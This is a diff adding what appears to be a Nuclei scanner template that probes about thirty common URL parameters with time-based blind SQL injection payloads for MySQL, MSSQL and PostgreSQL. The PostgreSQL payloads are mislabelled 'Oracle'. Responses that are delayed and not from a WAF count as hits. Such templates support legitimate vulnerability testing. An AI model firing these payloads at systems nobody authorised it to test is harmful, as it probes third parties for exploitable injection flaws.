@@ -1,0 +1,77 @@
+id: blind-based-sqli-sleep
+info:
+  name: Blind based SQLi (sleep)
+  author: chirag-3rag
+  severity: critical
+  description: URL test for blind sleep payloads.
+  reference:
+    - https://github.com/AssassinUKG
+  tags: sqli,blind
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{exts}}{{sleep_payload}}"
+    payloads:
+      sleep_payload:
+        # MySQL
+        - "(select*from(select(sleep(7)))a)"
+        - "%28select%2Afrom%28select%28sleep%287%29%29a%29"
+        - "1%20OR%20ELT%28%5B33%5D%3D%5B33%5D%2CSLEEP%28%5B7%5D%29%29"
+        - "1+AND+ELT%281337%3D1337%2CSLEEP%287%29%29"
+        # MSSQL
+        - ";waitfor delay '0:0:7'--"
+        - "%3Bwaitfor%20delay%20%270%3A0%3A7%27%2D%2D"
+        # Oracle
+        - "select%201%20from%20pg_sleep(7)"
+        - "%3B(select%201%20from%20pg_sleep(7))"
+        - "%7C%7C(select%201%20from%20pg_sleep(7))"
+      exts:
+        - "?pid="
+        - "?s="
+        - "?search_id="
+        - "?cat="
+        - "?id="
+        - "?page="
+        - "?dir="
+        - "?search="
+        - "?category="
+        - "?file="
+        - "?class="
+        - "?url="
+        - "?news="
+        - "?item="
+        - "?menu="
+        - "?lang="
+        - "?name="
+        - "?ref="
+        - "?title="
+        - "?view="
+        - "?topic="
+        - "?thread="
+        - "?type="
+        - "?date="
+        - "?form="
+        - "?join="
+        - "?main="
+        - "?nav="
+        - "?region="
+        - "?filename="
+
+    attack: clusterbomb
+    threads: 50
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=7 && duration<=8"
+      - type: word
+        words:
+          - "Access Denied"
+          - "Error 1006"
+          - "Cloudflare"
+          - "403 Forbidden"
+        condition: or
+        part: body
+        negative: true
